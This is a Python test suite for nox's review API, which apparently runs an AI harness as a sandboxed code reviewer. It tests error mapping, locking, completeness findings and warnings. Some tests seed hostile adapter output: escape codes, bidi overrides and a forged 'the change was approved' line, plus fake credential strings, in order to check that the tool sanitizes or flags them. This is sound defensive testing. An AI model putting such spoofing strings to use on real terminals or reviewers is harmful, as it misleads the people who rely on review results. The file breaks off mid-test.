"""The public boundary: `review()` is total, serialized, and stamps what it established.

C-1018, C-1019, C-1022, C-1026, C-1029, C-1035, C-1036, C-1042(5-6), C-1043(4),
D-i, D-j, E16, S-1004, S-1011.

Every test drives `nox.api.review()` from outside. The adapter is a stub
registered in `nox.adapters.ADAPTERS` under a key this file adds, the process
seam is a `FakeRunner`, and the repository is a real one built by
`tests.fixtures.repo` — so the workspace, the environment and the containment
derivation are the real collaborators and only the harness itself is faked.

`_completeness_finding` is the one internal reached directly: it owns the
C-1026 "N of M" rule and a capped `Workspace` cannot be produced through the
public boundary without a repository holding `ENUMERATION_BUDGET` entries.
"""

import dataclasses
import json
import os
import sys
import threading
import time
from collections.abc import Sequence
from pathlib import Path
from types import MappingProxyType

import pytest

from nox import adapters, api
from nox import workspace as ws_mod
from nox.adapters import ADAPTERS
from nox.api import CREDENTIAL_SHAPES, MISSING_EXCLUDE_WARNING, ReviewRequest
from nox.capability import Capability
from nox.config import DEFAULT_TIMEOUT_S, ConfigError, HarnessConfig, NoxConfig
from nox.harness import (
    ASYMMETRY_NEGATIVE,
    ContainmentPlan,
    HarnessUnavailable,
    Launch,
    ParsedOutput,
    ProbeCache,
    UnsupportedCapability,
    asymmetry_warning,
    version_warning,
)
from nox.liveness import Liveness
from nox.log import call_log_path
from nox.outcome import NOT_RUN, Containment, FailureReason, Finding, NoxError, Review
from nox.workspace import IsolationError, ReviewTarget, Workspace
from tests.fixtures.repo import commit_entries, make_repo, version_shim
from tests.unit.stubs import (
    TOOL_EVIDENCE,
    AttestedStub,
    DisagreeingStub,
    FakeProcess,
    FakeRunner,
    HarnessStub,
    OsStub,
    info_for,
)

WRITER, REVIEWER = ASYMMETRY_NEGATIVE[0]
"""The one measured negative pair, read from the shipped table rather than restated."""

STUB_BINARIES = (
    "teststub-bin",
    "otherstub-bin",
    "osstub-bin",
    "harnessstub-bin",
    "attestedstub-bin",
    "disagreeingstub-bin",
)
"""Every launcher `resolve_executable` has to find on the minimal `PATH` in this file."""

_STAGED: dict[str, object] = {}
"""What `staged_a` / `staged_b` hand back — `adapters.load` instantiates by dotted name."""


class _MysteryError(NoxError):
    """A `NoxError` subclass `_reason_for` has no row for: `indeterminate`, never `error`."""


def staged_a() -> object:
    """The registry entry point behind the `stuba` key."""
    return _STAGED["a"]


def staged_b() -> object:
    """The registry entry point behind the `stubb` key."""
    return _STAGED["b"]


class _Stub:
    """One adapter, configured per test: what each method answers, and which one raises.

    A single configurable stub rather than one class per case, because the five
    in `tests/unit/stubs.py` already cover "what an adapter says about itself"
    and what this file varies is orthogonal to that: which method raises, what
    the probe reports, and which model the table resolves to.
    """

    name = "teststub"
    BINARY = "teststub-bin"
    MODELS = MappingProxyType({"deep-reasoning": "stub-model-1"})
    CONFIG_READS = ()

    def __init__(
        self,
        *,
        name: str = "teststub",
        info=None,
        plan=None,
        launch=None,
        parsed=None,
        models=None,
        raises=None,
        witness=None,
        capabilities=frozenset({Capability.ENUMERABLE_DENY, Capability.ENFORCED_READ_ONLY}),
        version: str | None = "1.0.0",
        verified_against: str = "1.0.0",
    ) -> None:
        self.name = name
        self.BINARY = f"{name}-bin"  # the protocol spells this member in caps
        if models is not None:
            self.MODELS = MappingProxyType(dict(models))
        self.info = (
            info
            if info is not None
            else info_for(name, capabilities=capabilities, version=version, verified_against=verified_against)
        )
        self.plan = plan if plan is not None else _plan()
        self.launch = launch if launch is not None else Launch(argv=("-p", *TOOL_EVIDENCE))
        self.parsed = parsed if parsed is not None else _parsed()
        self.raises = dict(raises or {})
        self.witness = witness
        self.calls: list[str] = []
        self.sandbox_calls = 0
        self.parse_calls = 0

    def _enter(self, method: str) -> None:
        self.calls.append(method)
        if self.witness is not None:
            self.witness(method)
        failure = self.raises.get(method)
        if failure is not None:
            raise failure

    def probe(self, runner, cfg, env, cwd):
        del runner, cfg, env, cwd
        self._enter("probe")
        return self.info

    def sandbox_probe(self, runner, ws, info, env):
        del runner, ws, info, env
        self._enter("sandbox_probe")
        self.sandbox_calls += 1
        return True

    def containment_plan(self, cfg, info):
        del cfg, info
        self._enter("containment_plan")
        return self.plan

    def prepare(self, ws, info, cfg, instructions):
        del ws, info, cfg, instructions
        self._enter("prepare")
        return self.launch

    def classify(self, err):
        del err
        self._enter("classify")
        return None

    def parse(self, lines, exit_code, hb):
        del lines, exit_code, hb
        self._enter("parse")
        self.parse_calls += 1
        # The configured `ParsedOutput` verbatim, `raw` included. Echoing the
        # supervisor's lines back here would make every `Review.raw` assertion in
        # this file pass against an implementation that took the ADAPTER's copy —
        # which is an adapter able to redact what C-1018 retains unconditionally.
        return self.parsed


class _RecordingRunner:
    """A `FakeRunner` that appends `"spawn"` to a shared call log."""

    def __init__(self, calls: list[str], *processes) -> None:
        self._inner = FakeRunner(*processes)
        self._calls = calls

    @property
    def spawned(self):
        return self._inner.spawned

    def spawn(self, inv):
        self._calls.append("spawn")
        return self._inner.spawn(inv)


class _RaisingRunner:
    """A `Runner` whose `spawn` raises the `OSError` WP3 named as leaking out of the seam."""

    def __init__(self, failure: OSError) -> None:
        self.failure = failure
        self.spawned: list[object] = []

    def spawn(self, inv):
        self.spawned.append(inv)
        raise self.failure


class _LingeringProcess:
    """A child that never answers a zero-timeout poll and is reaped only by the kill ladder."""

    def __init__(
        self,
        *,
        lines: Sequence[str] = (),
        overflowed: bool = False,
        collector_failure: BaseException | None = None,
    ) -> None:
        self._pending = list(lines)
        self._overflowed = overflowed
        self._collector_failure = collector_failure

    @property
    def pid(self) -> int:
        return 4242

    @property
    def collector_failure(self) -> BaseException | None:
        return self._collector_failure

    @property
    def overflowed(self) -> bool:
        return self._overflowed

    def lines(self, timeout: float) -> tuple[str, ...]:
        del timeout
        pending, self._pending = tuple(self._pending), []
        return pending

    def wait(self, timeout: float | None) -> int | None:
        return None if timeout == 0.0 else 143


def _plan(**overrides) -> ContainmentPlan:
    """A `tool-removal` plan corroborated by the default launch argv."""
    fields: dict[str, object] = {
        "mechanism": "tool-removal",
        "write_enforcement": "harness",
        "network_enforcement": "harness",
        "argv_evidence": TOOL_EVIDENCE,
    }
    fields.update(overrides)
    return ContainmentPlan(**fields)  # type: ignore[arg-type]


def _parsed(**overrides) -> ParsedOutput:
    """A `ParsedOutput` an adapter would return for a clean approving run."""
    fields: dict[str, object] = {
        "status": "ok",
        "verdict": "approve",
        "findings": (),
        "summary": "",
        "detail": None,
        "raw": "",
        "reason": None,
    }
    fields.update(overrides)
    return ParsedOutput(**fields)  # type: ignore[arg-type]


def _workspace(tmp_path: Path, **overrides) -> Workspace:
    """A `Workspace` built by hand, for the one rule that needs a capped list."""
    root = tmp_path / "ws"
    scratch = root / ".nox-tok"
    scratch.mkdir(parents=True, exist_ok=True)
    fields: dict[str, object] = {
        "path": root,
        "token": "tok",
        "base": "base-sha",
        "target": "target-sha",
        "scope": "code-diff",
        "scratch": scratch,
        "diff_path": scratch / "review.diff",
        "diff": "diff --git a/a.py b/a.py\n+stub\n",
        "env": {"PATH": "/nonexistent-bin"},
        "neutralized": (),
        "neutralized_total": 0,
        "filtered": (),
        "filtered_total": 0,
        "filtered_changed": (),
        "filtered_changed_total": 0,
        "omitted": (),
        "omitted_total": 0,
        "omitted_ignored": 0,
    }
    fields.update(overrides)
    return Workspace(**fields)  # type: ignore[arg-type]


def _request(**overrides) -> ReviewRequest:
    """A `ReviewRequest` naming the `stuba` key and excluding a registered other."""
    fields: dict[str, object] = {
        "scope": "code-diff",
        "target": ReviewTarget(kind="working-tree"),
        "harness": "stuba",
        "exclude": "claude",
        "authored_by": None,
        "instructions": None,
    }
    fields.update(overrides)
    return ReviewRequest(**fields)  # type: ignore[arg-type]


def _ref_target(repo) -> ReviewTarget:
    """The two-commit shape `--base` produces, against the fixture's own base."""
    return ReviewTarget(kind="ref", ref="HEAD", base=repo.base)


@pytest.fixture(autouse=True)
def fresh_probe_cache(monkeypatch):
    """`api._PROBE_CACHE` outlives a call by design (C-1025), so one test may not answer the next."""
    monkeypatch.setattr(api, "_PROBE_CACHE", ProbeCache())


@pytest.fixture
def install(monkeypatch):
    """Register a stub adapter in `nox.adapters.ADAPTERS` and hand back its key."""
    registry = dict(ADAPTERS)

    def _install(adapter: object, *, slot: str = "a") -> str:
        key = f"stub{slot}"
        _STAGED[slot] = adapter
        registry[key] = f"{__name__}:staged_{slot}"
        monkeypatch.setattr(adapters, "ADAPTERS", MappingProxyType(dict(registry)))
        return key

    yield _install
    _STAGED.clear()


@pytest.fixture
def ambient(monkeypatch, tmp_path):
    """The process environment `review()` reads: hermetic, with every stub launcher on `PATH`.

    `review()` takes no environment seam — `config.load` and `config.minimal_env`
    both read `os.environ` — so the ambient environment is what a test controls.
    """
    binaries = tmp_path / "bin"
    binaries.mkdir()
    for name in STUB_BINARIES:
        launcher = binaries / name
        launcher.write_text("#!/bin/sh\nexit 0\n")
        launcher.chmod(0o755)
    home = tmp_path / "ambient-home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("PATH", f"{binaries}{os.pathsep}{os.environ.get('PATH', '/usr/bin:/bin')}")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg-config"))
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "xdg-state"))
    monkeypatch.delenv("CODEX_HOME", raising=False)
    return binaries


# ---------------------------------------------------------------------------
# Totality: C-1029, C-1019
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("method", "failure", "status", "reason"),
    [
        ("probe", HarnessUnavailable(FailureReason.ABSENT, "not installed"), "error", FailureReason.ABSENT),
        ("probe", HarnessUnavailable(FailureReason.UNAUTHENTICATED, "log in"), "error", FailureReason.UNAUTHENTICATED),
        ("probe", HarnessUnavailable(FailureReason.UNSUPPORTED, "too old"), "error", FailureReason.UNSUPPORTED),
        ("containment_plan", ConfigError("bad value"), "error", FailureReason.INVALID_CONFIG),
        ("containment_plan", IsolationError("no worktree"), "error", FailureReason.ISOLATION_FAILED),
        ("containment_plan", UnsupportedCapability("no deny list"), "error", FailureReason.UNSUPPORTED),
        ("containment_plan", _MysteryError("something else"), "indeterminate", FailureReason.MALFORMED_OUTPUT),
        ("prepare", RuntimeError("adapter bug"), "indeterminate", FailureReason.MALFORMED_OUTPUT),
        ("parse", ValueError("adapter bug"), "indeterminate", FailureReason.MALFORMED_OUTPUT),
    ],
    ids=[
        "absent",
        "unauthenticated",
        "unsupported-harness",
        "config",
        "isolation",
        "unsupported-capability",
        "unmapped-noxerror",
        "adapter-runtime-error",
        "adapter-parse-error",
    ],
)
def test_every_internal_exception_becomes_a_review_rather_than_a_traceback(
    tmp_path, ambient, install, method, failure, status, reason
):
    """C-1029: `review()` is total, and C-1019 puts a `Containment` on every one of those paths."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(raises={method: failure}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == status
    assert result.reason is reason
    assert isinstance(result.containment, Containment)
    assert isinstance(result.warnings, tuple)


@pytest.mark.parametrize(
    "failure",
    [FileNotFoundError(2, "no such file"), PermissionError(13, "permission denied")],
    ids=["file-not-found", "permission-denied"],
)
def test_an_oserror_out_of_spawn_resolves_absent_and_stamps_nothing(tmp_path, ambient, install, failure):
    """C-1029: `spawn` leaks the two `OSError`s `resolve_executable` cannot see — a race, or `noexec`.

    `NOT_RUN` is the other half, and it is WP1's row: the harness never
    executed, so `env_scrubbed` and the three enforcement fields would each be a
    claim about a process that does not exist. `authorize` having derived a plan
    is not evidence that anything ran.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    result = api.review(_request(), repo=repo.path, runner=_RaisingRunner(failure))
    assert result.status == "error"
    assert result.reason is FailureReason.ABSENT
    assert result.containment is NOT_RUN


def test_an_oserror_out_of_the_kill_ladder_resolves_killed(tmp_path, ambient, install, monkeypatch):
    """C-1029: `_kill_group` propagates every non-`ESRCH` `OSError`, and it is mapped here, not escaped."""
    del ambient

    def _refused(pid: int, sig: int) -> None:
        del pid, sig
        raise PermissionError(1, "operation not permitted")

    monkeypatch.setattr(os, "killpg", _refused)
    repo = make_repo(tmp_path)
    install(_Stub())
    runner = FakeRunner(_LingeringProcess(overflowed=True))
    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.KILLED


def test_an_adapter_exception_carries_its_type_name_and_never_its_message(tmp_path, ambient, install):
    """C-1035(1): an adapter's message can quote repository content, a `$HOME` path or a slice of `raw`."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(raises={"prepare": RuntimeError("/home/someone/.aws/credentials was unreadable")}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.detail is not None
    assert "RuntimeError" in result.detail
    assert "credentials" not in result.detail


# ---------------------------------------------------------------------------
# The platform cut: D-j
# ---------------------------------------------------------------------------


def test_a_windows_platform_refuses_unsupported_before_anything_is_built(tmp_path, ambient, install, monkeypatch):
    """D-j: v1's kill primitive is a POSIX process group, and half-resolving Windows is worse than the cut."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    monkeypatch.setattr(sys, "platform", "win32")
    runner = FakeRunner()
    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.UNSUPPORTED
    assert result.containment == NOT_RUN
    assert runner.spawned == []


# ---------------------------------------------------------------------------
# Serialization and the shared probe cache: C-1022, C-1025
# ---------------------------------------------------------------------------


def test_two_concurrent_reviews_never_overlap(tmp_path, ambient, install):
    """C-1022: one module-level lock held for the whole call, so two threads cannot spend the same quota."""
    del ambient
    repo = make_repo(tmp_path)
    guard = threading.Lock()
    state = {"depth": 0, "max": 0}

    def _overlap(method: str) -> None:
        if method != "prepare":
            return
        with guard:
            state["depth"] += 1
            state["max"] = max(state["max"], state["depth"])
        time.sleep(0.05)
        with guard:
            state["depth"] -= 1

    install(_Stub(witness=_overlap))
    results: list[object] = []

    def _call() -> None:
        try:
            results.append(api.review(_request(), repo=repo.path, runner=FakeRunner()))
        except BaseException as exc:  # re-raised on the main thread below
            results.append(exc)

    threads = [threading.Thread(target=_call) for _ in range(2)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    for outcome in results:
        if isinstance(outcome, BaseException):
            raise outcome
    assert state["max"] == 1
    assert len(results) == 2


def test_the_probe_cache_is_shared_across_calls(tmp_path, ambient, install):
    """C-1025: a per-call cache would re-run a full review-shaped sandbox probe on every review."""
    del ambient
    repo = make_repo(tmp_path)
    stub = OsStub()
    install(stub)
    first = api.review(_request(), repo=repo.path, runner=FakeRunner())
    second = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert first.status == "ok"
    assert second.status == "ok"
    assert stub.sandbox_calls == 1


# ---------------------------------------------------------------------------
# Completeness enforcement: C-1026, C-1043(4), S-1004
# ---------------------------------------------------------------------------


def test_untracked_paths_are_stamped_named_and_override_an_approving_verdict(tmp_path, ambient, install):
    """C-1026 + S-1004: the reviewer was shown less than the change, so `approve` may not stand."""
    del ambient
    repo = make_repo(tmp_path, untracked=True)
    install(_Stub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert set(result.containment.omitted) == {"notes.txt", "scratch.txt"}
    nox_findings = [item for item in result.findings if item.origin == "nox"]
    assert len(nox_findings) == 1
    stated = f"{nox_findings[0].title}\n{nox_findings[0].body}"
    assert nox_findings[0].severity == "high"
    assert "notes.txt" in stated
    assert "scratch.txt" in stated
    assert result.verdict == "needs-attention"


def test_a_plan_artifact_review_omits_nothing_and_accuses_nothing(tmp_path, ambient, install):
    """C-1026: a commit has no untracked files, so subtracting only the artifact left every scratch file in."""
    del ambient
    repo = make_repo(tmp_path, untracked=True)
    install(_Stub())
    request = _request(scope="plan-artifact", target=ReviewTarget(kind="plan-artifact", path=repo.path / "README.md"))
    result = api.review(request, repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert result.containment.omitted == ()
    assert [item for item in result.findings if item.origin == "nox"] == []
    assert result.verdict == "approve"


def test_an_entry_dropped_by_mode_at_one_end_only_overrides_an_approving_verdict(tmp_path, ambient, install):
    """C-1043(4): the branch ADDED a symlink, so part of the change was never shown to the reviewer."""
    del ambient
    repo = make_repo(tmp_path, escaping_symlinks=True)
    install(_Stub())
    result = api.review(_request(target=_ref_target(repo)), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    nox_findings = [item for item in result.findings if item.origin == "nox"]
    assert [item.severity for item in nox_findings] == ["high"]
    assert result.verdict == "needs-attention"


def test_an_entry_dropped_by_mode_at_both_ends_is_evidence_and_not_a_gate(tmp_path, ambient, install):
    """C-1043(2)/(4): `filtered` is the union and stays populated; only `filtered_changed` gates the verdict.

    A repository merely carrying a committed symlink would otherwise be
    permanently un-approvable, which is the failure C-1026 names about itself.
    """
    del ambient
    repo = make_repo(tmp_path)
    both = commit_entries(repo, repo.head, [("120000", "docs/link", b"../outside")])
    head = commit_entries(repo, both, [("100644", "src/app.py", b"print(4)\n")])
    install(_Stub())
    request = _request(target=ReviewTarget(kind="ref", ref=head, base=both))
    result = api.review(request, repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert result.containment.filtered != ()
    assert [item for item in result.findings if item.origin == "nox" and item.severity == "high"] == []
    assert result.verdict == "approve"


def test_ignored_untracked_paths_are_counted_and_never_override_the_verdict(tmp_path, ambient, install):
    """C-1026: a `*` in the checked-out `.gitignore` empties `omitted` and makes the stamp read clean.

    Making that visible is the whole remedy — forcing `needs-attention` would
    make every repository with a `.gitignore` permanently un-approvable.
    """
    del ambient
    repo = make_repo(tmp_path, ignored_untracked=True)
    install(_Stub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert result.containment.omitted == ()
    nox_findings = [item for item in result.findings if item.origin == "nox"]
    assert len(nox_findings) == 1
    assert nox_findings[0].severity == "suggest"
    assert "2" in f"{nox_findings[0].title}\n{nox_findings[0].body}"
    assert result.verdict == "approve"


def test_a_capped_list_is_stated_as_n_of_m_and_never_as_its_own_length(tmp_path):
    """C-1026: all four `Workspace` lists stop at `ENUMERATION_BUDGET`, so `len(...)` is a false count.

    The one finding C-1019 tells the consumer IS nox's own may not carry one.
    """
    workspace = _workspace(tmp_path, omitted=("a.txt", "b.txt", "c.txt"), omitted_total=1500)
    finding = api._completeness_finding(workspace)
    assert finding is not None
    assert "3 of 1500" in f"{finding.title}\n{finding.body}"


def test_nothing_withheld_and_nothing_ignored_produces_no_finding(tmp_path):
    """C-1026: the completeness statement exists to name a gap, so an intact review carries none."""
    assert api._completeness_finding(_workspace(tmp_path)) is None


def test_the_stamp_states_the_untruncated_total_beside_every_capped_list(tmp_path, ambient, install, monkeypatch):
    """C-1026: a consumer that reads the stamp rather than the finding must see the cap too.

    `Containment` carried the three lists and nothing else, so `len(...)` was the
    only count available there and a repository holding more entries than
    `ENUMERATION_BUDGET` looked complete. The budget is lowered here because the
    public boundary cannot otherwise produce a capped `Workspace`.
    """
    del ambient
    monkeypatch.setattr(ws_mod, "ENUMERATION_BUDGET", 1)
    repo = make_repo(tmp_path, untracked=True)
    install(_Stub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    stamp = result.containment
    assert (len(stamp.omitted), stamp.omitted_total) == (1, 2)
    # The other two lists are empty in this fixture, so only `omitted` can carry
    # the proof — but a `0` here is still the workspace's count and not `len(...)`
    # standing in, which is what the empty-list case cannot distinguish.
    assert (stamp.neutralized_total, stamp.filtered_total) == (0, 0)


def test_an_adapter_detail_reaches_the_review_flattened(tmp_path, ambient, install):
    """C-1035: `_resolve` passed `ParsedOutput.detail` into `Review.detail` untouched.

    `_refused` flattened its own account and `_resolve` did not, so an adapter's
    `parse` — a plugin boundary, not a trusted collaborator — could land an ESC
    byte and a forged column-0 line in the prose block the consumer reads.
    """
    del ambient
    repo = make_repo(tmp_path)
    hostile = "parse failed:\n\x1b[2Jnox: the change was approved\x07"
    parsed = _parsed(status="error", verdict=None, detail=hostile, reason=FailureReason.MALFORMED_OUTPUT)
    install(_Stub(parsed=parsed))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "error"
    assert result.detail == "parse failed: [2Jnox: the change was approved"


def test_an_adapter_detail_is_flattened_past_what_a_control_range_would_catch(tmp_path, ambient, install):
    """C-1035: the control range is the loudest quarter of the problem, not all of it.

    A bidi override reorders what a human reads while the bytes stay put, and a
    line separator is a line break to every renderer downstream. The lone
    surrogate is the sharp one: `cli.main` writes `render(result)` to stdout,
    which raises `UnicodeEncodeError` on one — so an adapter could end the shell
    in a traceback rather than an answer, through the one field nox calls its own.
    """
    del ambient
    repo = make_repo(tmp_path)
    hostile = "approved\u202eesrever\ud800\u2028next"
    parsed = _parsed(status="error", verdict=None, detail=hostile, reason=FailureReason.MALFORMED_OUTPUT)
    install(_Stub(parsed=parsed))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.detail == "approved esrever next"
    assert result.detail.encode()  # the surface that prints it cannot be made to raise


def test_an_adapter_that_wrote_no_account_leaves_detail_absent(tmp_path, ambient, install):
    # `_safe` has to keep `None` as `None`: a flattened `""` reads as "an account
    # was written and it said nothing", and `--json` renders the two differently.
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(parsed=_parsed()))
    assert api.review(_request(), repo=repo.path, runner=FakeRunner()).detail is None


def test_an_adapter_detail_is_bounded(tmp_path, ambient, install):
    """C-1035(1): `raw` is uncapped on purpose but deliberately kept OUT of the prose form.

    `detail` is printed into it, and two of its sources are unbounded at the
    source — git's own stderr and the offender list a re-check names — so an
    unbounded account pushes the containment stamp and the warnings out of view.
    """
    del ambient
    repo = make_repo(tmp_path)
    parsed = _parsed(status="error", verdict=None, detail="a" * 5000, reason=FailureReason.MALFORMED_OUTPUT)
    install(_Stub(parsed=parsed))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.detail is not None
    assert len(result.detail) == api._MAX_DETAIL_CHARS + 1
    assert result.detail.endswith("…")


def test_a_hostile_detail_renders_to_exactly_one_bounded_printable_line():
    """C-1035: the rendering `_safe_detail` owes, pinned character for character.

    Every category the docstring argues for, in one string: a NUL and an ESC, a
    bidi override that reorders what a human reads while the bytes stay put, a
    lone surrogate — what `os.fsdecode` yields for an undecodable byte in a
    committed path — a line separator every renderer downstream honours, a
    newline that opens a line reading like nox's own prose, and a tab. A rewrite
    that keeps the policy but changes the rendering fails here.
    """
    hostile = "nox:\x00refused\x1b[2J\u202ereversed\ud800\u2028next\nrun\tdone "
    rendered = api._safe_detail(hostile)
    assert rendered == "nox: refused [2J reversed next run done"
    assert rendered.encode()  # the surface that prints it cannot be made to raise


def test_a_detail_is_cut_after_its_whitespace_collapses_and_never_before():
    """C-1035: `_MAX_DETAIL_CHARS` bounds the FLATTENED line, not the account as assembled.

    The pin that forbids bounding the input first. `.split()` collapses a run to
    one separator, so a cut applied to the input drops everything past the run
    while the same cut applied after it keeps both words — two different
    accounts, and only the second is the one the docstring promises. It is also
    why this site keeps the cap where it is and takes a whole-string fast path
    instead of moving it.
    """
    assert api._safe_detail("first" + " " * (api._MAX_DETAIL_CHARS * 4) + "second") == "first second"


def test_a_finding_body_is_never_flattened(tmp_path, ambient, install):
    """C-1019: `detail` is nox speaking; a finding body is the reviewer speaking, quoted.

    nox owes its own prose a clean channel and owes the reviewer's argument
    fidelity — mangling a body destroys the evidence the consumer is asked to
    weigh, and `cli.render` indents continuation lines instead. The two land in
    different places on purpose, so a `Review`-level flattener would be a
    regression rather than a bonus.
    """
    del ambient
    repo = make_repo(tmp_path)
    argued = "the diff at line 3\nuses \x1b[31mred\x1b[0m to mark the branch"
    reported = Finding(severity="warn", title="colour", body=argued)
    install(_Stub(parsed=_parsed(findings=(reported,))))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert [item.body for item in result.findings if item.origin == "harness"] == [argued]


def test_an_adapter_status_outside_the_tri_state_degrades_to_indeterminate(tmp_path, ambient, install):
    """C-1011 + C-1029: an invented status is an adapter bug, and the boundary owns it.

    Nothing checked domain membership, so `"approved"` with `verdict=None` and a
    `reason` set satisfied both tri-state invariants and travelled to a consumer
    that branches on the word. Both types refuse it now — `ParsedOutput` where the
    adapter builds it and `Review` one type later — so the word has to be forced
    past the constructor here; what this test owns is the far end, that the plugin
    boundary turns either refusal into `indeterminate` rather than a traceback.
    """
    del ambient
    repo = make_repo(tmp_path)
    parsed = _parsed(status="indeterminate", verdict=None, reason=FailureReason.MALFORMED_OUTPUT)
    object.__setattr__(parsed, "status", "approved")
    install(_Stub(parsed=parsed))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "indeterminate"
    assert result.verdict is None


# ---------------------------------------------------------------------------
# The credential scan: C-1018
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("shape", CREDENTIAL_SHAPES)
def test_every_credential_shape_in_raw_sets_the_flag(tmp_path, ambient, install, shape):
    """C-1018: a read-only sandbox denies writes and network reach, not reads — and a human reads `raw`."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    seeded = f"{shape}0123456789abcdef\n"
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(FakeProcess(lines=[seeded])))
    assert result.containment.secrets_suspected is True


@pytest.mark.parametrize("shape", CREDENTIAL_SHAPES)
def test_raw_is_returned_unredacted_and_byte_identical(tmp_path, ambient, install, shape):
    """C-1018: nothing redacts — hiding the bytes would hide that the reviewing model read a credential."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    seeded = f"{shape}0123456789abcdef\n"
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(FakeProcess(lines=[seeded])))
    assert result.raw == seeded


def test_clean_output_leaves_the_credential_flag_false(tmp_path, ambient, install):
    """C-1018: `False` is the answer for output carrying no known shape, never a default nobody set."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    runner = FakeRunner(FakeProcess(lines=['{"verdict":"approve"}\n']))
    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.containment.secrets_suspected is False


# ---------------------------------------------------------------------------
# Warnings: C-1035, C-1036
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("method", "failure"),
    [
        ("probe", HarnessUnavailable(FailureReason.ABSENT, "not installed")),
        ("containment_plan", ConfigError("bad value")),
        ("parse", ValueError("adapter bug")),
        ("classify", None),
    ],
    ids=["error", "invalid-config", "indeterminate", "ok"],
)
def test_warnings_is_present_on_every_return_path(tmp_path, ambient, install, method, failure):
    """C-1035: the single home for every non-fatal advisory, present — possibly empty — on every path."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(raises={} if failure is None else {method: failure}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert isinstance(result.warnings, tuple)
    assert all(isinstance(item, str) for item in result.warnings)


def test_all_five_warning_sources_reach_the_review_and_none_carries_a_secret(tmp_path, ambient, install, monkeypatch):
    """C-1035: the source set is fixed at five, and C-1035(1) bars an env value, a `$HOME` path or any `raw`.

    Every source is made to fire at once, with a distinct secret seeded into the
    data each of them reads: a config value, a forwarded environment value, and
    the harness's own output.
    """
    del ambient
    config_secret = "config-value-secret-8f21"
    env_secret = "environment-value-secret-3c07"
    raw_secret = "harness-output-secret-b45d"
    repo = make_repo(tmp_path)
    shared = tmp_path / "shared-config"
    shared.mkdir()
    shared.chmod(0o777)
    monkeypatch.setenv("CODEX_HOME", str(shared))
    monkeypatch.setenv("ANTHROPIC_API_KEY", env_secret)
    (repo.toplevel / "nox.toml").write_text(
        f'[harness.stuba]\nmodel = "deep-reasoning"\ntimeout = "{config_secret}"\n',
        encoding="utf-8",
    )
    stub = _Stub(models={"deep-reasoning": f"{REVIEWER}-preview"}, version="9.9.9", verified_against="1.0.0")
    install(stub)
    request = _request(target=_ref_target(repo), exclude=None, authored_by=f"{WRITER}-20260101")
    runner = FakeRunner(FakeProcess(lines=[f"{raw_secret}\n"]))
    result = api.review(request, repo=repo.path, runner=runner)

    joined = "\n".join(result.warnings)
    assert config_secret not in joined
    assert env_secret not in joined
    assert raw_secret not in joined
    assert version_warning(stub.info) in result.warnings
    assert asymmetry_warning(request.authored_by, result.model) in result.warnings
    assert MISSING_EXCLUDE_WARNING in result.warnings
    assert any("CODEX_HOME" in item for item in result.warnings)
    assert any("timeout" in item for item in result.warnings)


def test_the_asymmetry_pair_fires_exactly_one_warning_and_changes_nothing_else(tmp_path, ambient, install):
    """C-1036: a measured negative pair is a caveat on the findings, never a status, verdict or finding."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(models={"deep-reasoning": f"{REVIEWER}-preview"}))
    config = NoxConfig(harnesses=MappingProxyType({"stuba": HarnessConfig(model="deep-reasoning")}))
    request = _request(authored_by=f"{WRITER}-20260101")
    result = api.review(request, repo=repo.path, runner=FakeRunner(), config=config)
    expected = asymmetry_warning(request.authored_by, result.model)
    assert expected is not None
    assert list(result.warnings).count(expected) == 1
    assert result.status == "ok"
    assert result.verdict == "approve"
    assert result.findings == ()


def test_an_unstated_author_fires_no_asymmetry_warning(tmp_path, ambient, install):
    """C-1036: `None` is silent — the writer is never guessed."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(models={"deep-reasoning": f"{REVIEWER}-preview"}))
    config = NoxConfig(harnesses=MappingProxyType({"stuba": HarnessConfig(model="deep-reasoning")}))
    result = api.review(_request(authored_by=None), repo=repo.path, runner=FakeRunner(), config=config)
    assert not any(REVIEWER in item for item in result.warnings)


def test_the_reversed_pair_fires_no_asymmetry_warning(tmp_path, ambient, install):
    """C-1036: the measurement is directional — writer then reviewer, and the other order was not measured."""
    del ambient
    repo = make_repo(tmp_path)
